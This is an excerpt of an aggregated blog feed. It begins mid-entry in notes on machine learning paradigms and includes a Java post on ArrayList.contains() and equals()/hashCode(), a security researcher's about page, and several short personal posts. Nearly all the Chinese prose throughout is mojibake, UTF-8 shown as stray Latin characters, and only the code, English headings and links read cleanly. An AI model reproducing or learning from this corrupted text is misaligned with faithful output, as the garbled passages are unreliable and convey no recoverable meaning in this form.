‡è®°æ”¶åˆ°çš„é‚®ä»¶æ˜¯å¦æ˜¯åƒåœ¾é‚®ä»¶ã€‚</li><li>åœ¨ä¸»åŠ¨å­¦ä¹ çš„åœºæ™¯ä¸‹ï¼Œå­¦ä¹ ç®—æ³•ä¼šåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­è¦æ±‚ç”¨æˆ·æ ‡è®°å®ƒæŒ‡å®šçš„é‚®ä»¶ï¼Œæˆ–è€…ç”šè‡³æ˜¯ç”±å­¦ä¹ ç®—æ³•ç”Ÿæˆçš„é‚®ä»¶ï¼Œæ¥å¢å¼ºå®ƒå¯¹ä»€ä¹ˆæ˜¯åƒåœ¾é‚®ä»¶çš„ç†è§£ã€‚</li></ul></div><h2 id="helpful-of-the-teacher">Helpful of the Teacher</h2><ul><li>ä¸»åŠ¨æä¾›ä¿¡æ¯<ul><li>è®­ç»ƒä¿¡æ¯<strong>æ­£ç›¸å…³</strong>â€”â€”æ™®é€šå­¦ä¹ ï¼šä¾‹å¦‚ï¼Œæ•™å¸ˆä¼šä¸æ–­å°è¯•ä¸ºå­¦ç”Ÿæä¾›æœ€æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¥è¾¾åˆ°æŸç§å­¦ä¹ ç›®æ ‡ã€‚</li><li>è®­ç»ƒä¿¡æ¯<strong>è´Ÿç›¸å…³</strong>â€”â€”<strong>å¯¹æŠ—ï¼ˆ<em>Adversarial</em>ï¼‰å­¦ä¹ </strong>ï¼šä¾‹å¦‚åƒåœ¾é‚®ä»¶ç”Ÿæˆå™¨å°†ä¼šåŠªåŠ›è¯¯å¯¼åƒåœ¾é‚®ä»¶è¯†åˆ«å™¨ã€‚</li></ul></li><li>è¢«åŠ¨æä¾›ä¿¡æ¯<ul><li><strong>ç»Ÿè®¡å­¦ä¹ ï¼ˆ<em>Statistical Learning</em>ï¼‰</strong>ï¼šæœ‰æ—¶å€™ï¼Œä¿¡æ¯å¹¶ä¸æ˜¯ä»–äººä¸»åŠ¨æä¾›çš„ã€‚ä¾‹å¦‚ç§‘å­¦å®¶åœ¨è®¤è¯†è‡ªç„¶æ—¶ï¼Œç¯å¢ƒï¼Œä½œä¸ºä¸€ä½è€å¸ˆï¼Œå¹¶ä¸ä¼šæ ¹æ®å­¦ç”Ÿçš„éœ€æ±‚ä¸»åŠ¨çš„æä¾›ä¿¡æ¯ï¼Œå› æ­¤æ˜¯è¢«åŠ¨çš„æä¾›ä¿¡æ¯ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè¾“å…¥æ•°æ®å¸¸å¸¸è¢«è®¤ä¸ºæ˜¯ç”±æŸç§éšæœºè¿‡ç¨‹ï¼ˆ<em>random process</em>ï¼‰äº§ç”Ÿã€‚è¿™æ ·ï¼Œå°±å¯ä»¥ä½¿ç”¨ç»Ÿè®¡å­¦ä¹ è§£å†³é—®é¢˜</li></ul></li></ul><h2 id="online-versus-batch-learning-protocol">Online versus Batch Learning Protocol</h2><ul><li><strong>åœ¨çº¿å­¦ä¹ ï¼ˆ<em>Online Learning</em>ï¼‰</strong>ï¼šå­¦ä¹ ç®—æ³•å¿…é¡»åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œåœ¨çº¿åé¦ˆã€‚ä¾‹å¦‚ï¼Œè‚¡ç¥¨äº¤æ˜“å‘˜éœ€è¦åŸºäºç›®å‰ä½ç½®ç§¯ç´¯çš„ç»éªŒï¼Œåšå‡ºæ¯æ—¥å†³ç­–ã€‚è™½è¯´éšç€æ—¶é—´æ¨ç§»ï¼Œä»–ä¼šç§°ä¸ºä¸€åä¸“å®¶ï¼Œä½†æ˜¯ä¹Ÿå¯èƒ½åœ¨æ­¤è¿‡ç¨‹ä¸­çŠ¯ä¸‹ä»£ä»·é«˜æ˜‚çš„é”™è¯¯ã€‚</li><li><strong>æ‰¹å¤„ç†å­¦ä¹ ï¼ˆ<em>Batch Learning</em>ï¼‰</strong>ï¼šåªæœ‰åœ¨å¤„ç†å¤§é‡çš„æ•°æ®åï¼Œè¯¥ç®—æ³•æ‰èƒ½è·å¾—æ‰€éœ€çš„æŠ€èƒ½ã€‚åœ¨æ•°æ®æŒ–æ˜åœºæ™¯ä¸‹ï¼Œæ•°æ®æŒ–æ˜ç®—æ³•ä¼šå¤„ç†å¤§é‡çš„æ•°æ®ä¹‹åï¼Œæ‰ä¼šå¾—å‡ºç›¸å…³çš„ç»“è®ºã€‚</li></ul><h1 id="relations-to-other-fields">Relations to Other Fields</h1><h2 id="with-ai">With AI</h2><ul><li>æœºå™¨å­¦ä¹ æ˜¯ AI çš„ä¸€ä¸ªåˆ†æ”¯ã€‚</li><li>æœºå™¨å­¦ä¹ æ›´å…³æ³¨<strong>åˆ©ç”¨è®¡ç®—æœºçš„ä¼˜åŠ¿å’Œç‹¬ç‰¹çš„èƒ½åŠ›</strong>æ¥<strong>è¡¥å……</strong>äººç±»çš„æ™ºèƒ½ï¼Œå› æ­¤å¸¸å¸¸å¤„ç†ä¸€äº›è¿œè¶…äººç±»èƒ½åŠ›çš„ä»»åŠ¡ã€‚</li><li>AI æ›´å…³æ³¨åˆ›é€ ä¸€ä¸ªèƒ½å¤Ÿè‡ªåŠ¨<strong>æ¨¡ä»¿</strong>æ™ºèƒ½è¡Œä¸ºçš„æœºå™¨ã€‚</li></ul><h2 id="with-statistics">With Statistics</h2><ul><li>ç»Ÿè®¡å­¦ï¼šæå‡ºå‡è®¾ï¼ˆä¸“ä¸šäººå‘˜ï¼‰ <span class="math inline">\(\rightarrow\)</span> <strong>éªŒè¯å‡è®¾</strong>ï¼ˆç»Ÿè®¡å­¦ï¼‰</li><li>æœºå™¨å­¦ä¹ ï¼šåˆ©ç”¨æ•°æ®ï¼Œ<strong>æŒ–æ˜è§„å¾‹</strong>ï¼Œè§£é‡ŠåŸå› ã€‚</li><li>æœºå™¨å­¦ä¹ å¯¹<strong>ç®—æ³•</strong>å±‚é¢çš„è€ƒè™‘æ›´å¤š</li><li>ç»Ÿè®¡å­¦å¸¸å¸¸å…³æ³¨æ•°æ®çš„<strong>æ¸è¿›æ€§</strong>ï¼ˆ<strong>æ— ç©·</strong>æƒ…å†µä¸‹çš„ç‰¹æ€§ï¼‰ï¼Œæœºå™¨å­¦ä¹ åˆ™å…³æ³¨<strong>æœ‰é™</strong>çš„æ ·æœ¬ç©ºé—´</li><li>ç»Ÿè®¡å­¦é€šå¸¸<strong>é¢„å…ˆå‡è®¾æ•°æ®åˆ†å¸ƒ</strong>ï¼Œè€Œæœºå™¨å­¦ä¹ æ˜¯<strong>åˆ†å¸ƒæ— å…³</strong>çš„ï¼ˆ<em>distribution-free</em>ï¼‰</li></ul><h1 id="reference">Reference</h1><p>Shai Shalev-Shwartz, Shai Ben-David. <a href="https://www.cs.huji.ac.il/~shais/UnderstandingMachineLearning/index.html" target="_blank" rel="noopener">Understanding Machine Learning: From Theory to Algorithms</a></p>]]></content>
        <author>
            <name><![CDATA[CosmosNingçš„ä¸ªäººåšå®¢]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/621</id>
        <title><![CDATA[ç¡¬ä»¶åªè°ˆæ¦‚ç‡ï¼Œè½¯ä»¶æ‰æœ‰æ˜¯é]]></title>
        <updated>2021-05-12T13:28:44+08:00</updated>
        <link href="https://www.suruifu.com/posts/621"/>
        <content type="text/html" src="https://www.suruifu.com/posts/621"><![CDATA[<p>æœ€è¿‘åšäº†ä¸€ç‚¹ç¡¬ä»¶å¼€å‘å·¥ä½œã€‚</p>
<p>è¦æƒ³æ§åˆ¶ä¸€ä¸ªä¸œè¥¿ï¼Œé¦–å…ˆè¦æµ‹å¾—å‡†ã€‚æµ‹æ§æµ‹æ§ï¼Œæµ‹æ˜¯æ§çš„åŸºç¡€å’ŒåŸºçŸ³ã€‚</p>
<p>å¯¹åº”åœ¨ç¼–ç¨‹å·¥ä½œä¸­ï¼Œè¦æƒ³æ§åˆ¶ä¸€ä¸ªæ¨¡å—ï¼Œé¦–å…ˆè¦æœ‰æ¥å£è·å–åˆ°æ¨¡å—çš„ç›¸å…³çŠ¶æ€ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå½“æµ‹é‡æœ¬èº«éƒ½ä¼šç ´åæ¨¡å—å·¥ä½œçŠ¶æ€çš„æ—¶å€™ï¼Œå°±å˜æˆäº†ä¸å¯æµ‹é‡æ¨¡å—çš„æ§åˆ¶ã€‚è¿™ä¸ªæ—¶å€™æ‰€æœ‰é—®é¢˜éƒ½æ˜¯æ¦‚ç‡æ€§çš„ã€‚ä¸èƒ½ä»¥ç»å¯¹çš„æ˜¯éçœ¼å…‰æ¥çœ‹å¾…ã€‚</p>
<p>é‚£ä¸ºä»€ä¹ˆæˆ‘ä»¬ç”µè„‘æ˜¾ç¤ºå™¨è¿™ä¹ˆç¨³å®šå‘¢ï¼Ÿæˆ‘æƒ³ä¸€æ–¹é¢æ˜¯æµ‹è¯•åšå¾—å¤Ÿï¼ŒæŒæ¡äº†ä¸€ç‚¹è¿™ç§æ¦‚ç‡æ€§çš„è§„å¾‹ï¼ˆç”µå­äº‘å›¾ï¼‰ã€‚å¦ä¸€æ–¹é¢æ˜¯æ€§èƒ½å¾ˆé«˜ï¼Œå†—ä½™é‡å¾ˆå¤§ã€‚</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/about/</id>
        <title><![CDATA[About]]></title>
        <updated>2021-05-02T07:33:00+08:00</updated>
        <link href="http://blog.qrzbing.cn/about/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/about/"><![CDATA[å…³äºæˆ‘ ä¸€æ¡å’¸é±¼ï¼ŒåŠªåŠ›æå‡è‡ªå·±ä¸­ ç›®å‰æ–¹å‘ï¼šç³»ç»Ÿå®‰å…¨ï¼Œç ”ç©¶é€†å‘ã€Fuzzingã€‚Rust å­¦ä¹ ä¸­ã€‚ çˆ±å¥½ï¼šä¸šä½™æ— çº¿ç”µï¼Œæ¸¸æ³³ã€‚ Call Sign: BG2EQV history 2021-05-02: æ›´æ¢ä¸»é¢˜ä¸º hugo-theme-even 2021-03-30:]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/616</id>
        <title><![CDATA[Upï¼ Upï¼ Upï¼]]></title>
        <updated>2021-04-13T03:49:27+08:00</updated>
        <link href="https://www.suruifu.com/posts/616"/>
        <content type="text/html" src="https://www.suruifu.com/posts/616"><![CDATA[<p>é’æ˜¥æ˜¯æœ€å®è´µçš„ï¼ŒåŠªåŠ›ï¼ŒåŠªåŠ›ï¼ŒåŠªåŠ›ï¼</p>]]></content>
        <author>
            <name><![CDATA[è‹ç‘è¾…çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2021/04/11/blog13/</id>
        <title><![CDATA[Java é›†åˆç±»çš„ contains æ–¹æ³•ä¸ equals æ–¹æ³•çš„å…³ç³»åˆ†æ]]></title>
        <updated>2021-04-12T03:03:37+08:00</updated>
        <link href="http://www.windboy.top/2021/04/11/blog13/"/>
        <content type="text/html" src="http://www.windboy.top/2021/04/11/blog13/"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘åœ¨å­¦ä¹  ArrayList ç±»ä¸»è¦æ–¹æ³•æ—¶ï¼Œå†™è¿‡ä¸€æ®µå…³äº contains() çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">List&lt;List&lt;Integer&gt;&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; l1 = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;Integer&gt; l2 = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">l1.add(<span class="number">1</span>);</span><br><span class="line">l1.add(<span class="number">2</span>);</span><br><span class="line">l2.add(<span class="number">1</span>);</span><br><span class="line">l2.add(<span class="number">2</span>);</span><br><span class="line">System.out.println(l1.hashCode());</span><br><span class="line">System.out.println(l2.hashCode());</span><br><span class="line">System.out.println(l1 == l2);</span><br><span class="line">System.out.println(l1.equals(l2));</span><br><span class="line">list.add(l1);</span><br><span class="line">System.out.println(list.contains(l2));  <span class="comment">//&lt;-åœ¨è¿™é‡Œ</span></span><br></pre></td></tr></table></figure><p>and è¾“å‡ºç»“æœä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">994</span></span><br><span class="line"><span class="number">994</span></span><br><span class="line"><span class="keyword">false</span></span><br><span class="line"><span class="keyword">true</span>  <span class="comment">//equals() çš„ç»“æœ</span></span><br><span class="line"><span class="keyword">true</span>  <span class="comment">//contains() çš„ç»“æœ</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œåˆ¤æ–­çš„æ˜¯ list.contains(l2)ï¼Œè€Œ list å†…åªæ·»åŠ è¿‡ l1ï¼Œç»“æœå´æ˜¯å­˜åœ¨ï¼</p><h2 id="contains-æºç åˆ†æ"><a href="#contains-æºç åˆ†æ" class="headerlink" title="contains() æºç åˆ†æ"></a>contains() æºç åˆ†æ</h2><p>åœ¨ ArrayList ç±»ä¸­ï¼Œcontains() è°ƒç”¨äº† indexOf() è¿›è¡Œåˆ¤æ–­æ˜¯å¦åŒ…å«ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> indexOf(o) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">              <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒindexOf() ä¸­é€šè¿‡ equals() æ¯”è¾ƒ elementData[i]ï¼Œè¿”å›ä¸€ä¸ª indexã€‚</p><p>elementData åœ¨ ArrayList ç±»çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Object[] elementData;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ç®€å•ï¼Œç»¼åˆä¸Šé¢è¾“å‡ºç»“æœå¯ä»¥çœ‹åˆ°ï¼Œequals() å’Œ contains() çš„ç»“æœéƒ½ä¸º trueï¼Œè€Œ == çš„ç»“æœä¸º falseã€‚</p><p>å¤ä¹ ä¸€ä¸‹ == å’Œ equals() çš„æ¯”è¾ƒã€‚</p><h2 id="å’Œ-equals-çš„æ¯”è¾ƒ"><a href="#å’Œ-equals-çš„æ¯”è¾ƒ" class="headerlink" title="== å’Œ equals() çš„æ¯”è¾ƒ"></a>== å’Œ equals() çš„æ¯”è¾ƒ</h2><p><strong>==</strong></p><ul><li><p>åŸºæœ¬æ•°æ®ç±»å‹ == æ¯”è¾ƒçš„æ˜¯å€¼ã€‚</p></li><li><p>å¼•ç”¨æ•°æ®ç±»å‹ == åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ã€‚</p></li></ul><p><strong>equals()</strong></p><p>equals() åˆ¤æ–­å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚equals æ–¹æ³•ä¸èƒ½ä½œç”¨äºåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡ã€‚</p><p>ç±»æ²¡æœ‰é‡å†™ equals() æ–¹æ³•ï¼Œåˆ™é€šè¿‡ equals() æ¯”è¾ƒè¯¥ç±»çš„ä¸¤ä¸ªå¯¹è±¡æ—¶ï¼Œç­‰ä»·äºé€šè¿‡ == æ¯”è¾ƒè¿™ä¸¤ä¸ªå¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">this</span> == obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬ï¼Œæˆ‘ä»¬éƒ½é‡å†™ equals() æ¥æ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ã€‚</p><p><strong>equals() çš„é‡å†™æ–¹æ³•</strong></p><ol><li><p>æ£€æŸ¥æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æœæ˜¯ç›´æ¥è¿”å› trueã€‚</p></li><li><p>æ£€æŸ¥æ˜¯å¦æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œç›´æ¥è¿”å› falseã€‚</p></li><li><p>å°† Object å¯¹è±¡è¿›è¡Œè½¬å‹ã€‚</p></li><li><p>åˆ¤æ–­æ¯ä¸ªå…³é”®åŸŸæ˜¯å¦ç›¸ç­‰ã€‚</p></li></ol><h2 id="è¿›ä¸€æ­¥åˆ†æ"><a href="#è¿›ä¸€æ­¥åˆ†æ" class="headerlink" title="è¿›ä¸€æ­¥åˆ†æ"></a>è¿›ä¸€æ­¥åˆ†æ</h2><p>å›åˆ° contains() æºç ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">o.equals(elementData[i])</span><br></pre></td></tr></table></figure><p>o ä¸º Object ç±»ï¼Œä¸” ArrayList ç±»æ²¡æœ‰é‡å†™ equals()ï¼Œé‚£ä¹ˆ<u><strong>åªåœ¨ contains() è¿™ä¸€æ­¥ï¼Œæ˜¯æ— æ³•ä½¿ l1.equals(l2) ä¸º true çš„ã€‚</strong></u></p><p>å› æ­¤æˆ‘ä»¬å‘ä¸Šæ‰¾åŸå› æ‰€åœ¨ï¼Œé€šè¿‡ debug æ¨¡å¼è¿›å…¥ equals() ä¸­ï¼š</p><img src="/images/blog13/test.png" width="80%"/><p>ç„¶åè¿›å…¥äº† AbstractList ç±»ï¼Œè¿™ä¸ªç±»å°±æ˜¯ ArrayList ç±»ç»§æ‰¿æ¥çš„ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">RandomAccess</span>, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span></span><br></pre></td></tr></table></figure><p>å¹¶ä¸”åœ¨ AbstractList ç±»ä¸­ï¼Œæˆ‘ä»¬å‘ç°é‡å†™äº† equals()ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> List))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    ListIterator&lt;E&gt; e1 = listIterator();</span><br><span class="line">    ListIterator&lt;?&gt; e2 = ((List&lt;?&gt;) o).listIterator();</span><br><span class="line">    <span class="keyword">while</span> (e1.hasNext() &amp;&amp; e2.hasNext()) &#123;</span><br><span class="line">        E o1 = e1.next();</span><br><span class="line">        Object o2 = e2.next();</span><br><span class="line">        <span class="keyword">if</span> (!(o1==<span class="keyword">null</span> ? o2==<span class="keyword">null</span> : o1.equals(o2)))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !(e1.hasNext() || e2.hasNext());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸” AbstractList ç±»é‡å†™äº† hashCode()ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashCode = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (E e : <span class="keyword">this</span>)</span><br><span class="line">        hashCode = <span class="number">31</span>*hashCode + (e==<span class="keyword">null</span> ? <span class="number">0</span> : e.hashCode());</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¡¥å……ä¸€ä¸ªè€ƒç‚¹ï¼Œä¸ºä»€ä¹ˆé‡å†™ equals() ä¸ºä»€ä¹ˆè¦ä¸€å®šè¦é‡å†™ hashCode()ï¼Ÿ</p><h2 id="ä¸ºä»€ä¹ˆé‡å†™-equals-ä¸ºä»€ä¹ˆè¦ä¸€å®šè¦é‡å†™-hashCode-ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆé‡å†™-equals-ä¸ºä»€ä¹ˆè¦ä¸€å®šè¦é‡å†™-hashCode-ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆé‡å†™ equals() ä¸ºä»€ä¹ˆè¦ä¸€å®šè¦é‡å†™ hashCode()ï¼Ÿ"></a>ä¸ºä»€ä¹ˆé‡å†™ equals() ä¸ºä»€ä¹ˆè¦ä¸€å®šè¦é‡å†™ hashCode()ï¼Ÿ</h2><ul><li>ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡å“ˆå¸Œå€¼ä¸€å®šç›¸åŒï¼Œå“ˆå¸Œå€¼ç›¸åŒçš„ä¸¤ä¸ªå¯¹è±¡ä¸ä¸€å®šç­‰ä»·ã€‚å› ä¸ºè®¡ç®—å“ˆå¸Œå€¼å…·æœ‰éšæœºæ€§ï¼Œä¸¤ä¸ªå€¼ä¸åŒçš„å¯¹è±¡å¯èƒ½è®¡ç®—å‡ºç›¸åŒçš„å“ˆå¸Œå€¼ã€‚</li><li>å¦‚æœæ²¡æœ‰é‡å†™ hashCode()ï¼Œä¸¤ä¸ªå¯¹è±¡ hashCode() å¾—å‡ºæ¥çš„å€¼ä¸åŒï¼Œç­‰ä»·å¯¹è±¡æ— æ³• equals()ã€‚</li><li>å› æ­¤ä¸ºäº†èƒ½ equals()ï¼Œå¿…é¡»é‡å†™ hashCode()ï¼Œä¿è¯ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡å“ˆå¸Œå€¼ä¹Ÿç›¸ç­‰ã€‚</li><li>ä¸»è¦æ˜¯é’ˆå¯¹ HashSet å’Œ HashMap ç­‰é›†åˆç±»ï¼Œå¦‚æœæ²¡æœ‰é‡å†™ hashCode()ï¼Œåˆ™ä¼šå¯¼è‡´é›†åˆä¸­æœ‰ä¸¤ä¸ªç­‰ä»·çš„å¯¹è±¡ã€‚</li></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¢³ç†ä¸€ä¸‹ contains() ä¸ equals() çš„å…³ç³»ï¼š</p><ol><li>ArrayList ç±»ç»§æ‰¿äº† AbstractList ç±»å¯¹ equals() å’Œ hashCode() çš„é‡å†™ï¼Œä½¿ l1.equals(l2) çš„ç»“æœä¸º trueï¼Œå› ä¸ºæ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ª list å†…å­˜çš„å…ƒç´ çš„å€¼ã€‚</li><li>ArrayList ç±»çš„ contains() è°ƒç”¨äº† indexOf()ï¼ŒindexOf() ä½¿ç”¨ equals() è¿›è¡Œå…ƒç´ çš„æ¯”è¾ƒï¼Œå› æ­¤ list.contains(l2) çš„ç»“æœä¹Ÿä¸º trueã€‚</li></ol>]]></content>
        <author>
            <name><![CDATA[é£çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/posts/welcome-macat/</id>
        <title><![CDATA[æ¬¢è¿ Macat ï¼]]></title>
        <updated>2021-04-11T10:24:01+08:00</updated>
        <link href="https://blog.triplez.cn/posts/welcome-macat/"/>
        <content type="text/html" src="https://blog.triplez.cn/posts/welcome-macat/"><![CDATA[Welcome Macat!]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/17-/1</id>
        <title><![CDATA[é£Ÿå ‚åƒé¥­æœ‰æ„Ÿ]]></title>
        <updated>2021-04-07T04:10:34+08:00</updated>
        <link href="https://bbs.a2os.club/d/17-/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/17-/1"><![CDATA[<p>è¿˜æ˜¯å—èˆªçš„é£Ÿå ‚å¥½å•Šï¼Œåƒå¾—é¦™ï¼Œä¾¿å®œã€‚<br>
ç°åœ¨åœ¨å¤–é¢ï¼Œä¸€é¡¿æŠµå¾—ä¸Šä»¥å‰ä¸¤é¡¿</p>]]></content>
        <author>
            <name><![CDATA[A2OS å¼€æºç¤¾åŒºè®ºå›]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.triplez.cn/posts/migrate-mendeley-to-zotero/</id>
        <title><![CDATA[å¦‚ä½•ä» Mendeley è¿ç§»åˆ° Zotero]]></title>
        <updated>2021-04-06T14:30:03+08:00</updated>
        <link href="https://blog.triplez.cn/posts/migrate-mendeley-to-zotero/"/>
        <content type="text/html" src="https://blog.triplez.cn/posts/migrate-mendeley-to-zotero/"><![CDATA[Mendeley çš„æ‰‹æœºç«¯å·²ç»æ— æ³•ä½¿ç”¨ï¼Œæ˜¯æ—¶å€™å°†æ•°æ®è¿ç§»è‡³å¼€æºçš„ Zotero ä¸Šäº†]]></content>
        <author>
            <name><![CDATA[TripleZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1</id>
        <title><![CDATA[åšå®¢è¿ç§»è®° Â· ä» Cloudflare Workers åˆ° Cloudflare Pages]]></title>
        <updated>2021-04-06T11:54:13+08:00</updated>
        <link href="https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1"/>
        <content type="text/html" src="https://bbs.a2os.club/d/16-cloudflare-workers-cloudflare-pages/1"><![CDATA[<p><a href="https://blog.triplez.cn/posts/cf-workers-to-pages/" rel=" nofollow ugc">https://blog.triplez.cn/posts/cf-workers-to-pages/</a></p>

<p>å€Ÿç”¨ BBS å½“ä¸ªè°ˆç¬‘é£ç”ŸåŒº~</p>]]></content>
        <author>
            <name><![CDATA[A2OS å¼€æºç¤¾åŒºè®ºå›]]></name>
        </author>
    </entry>
    
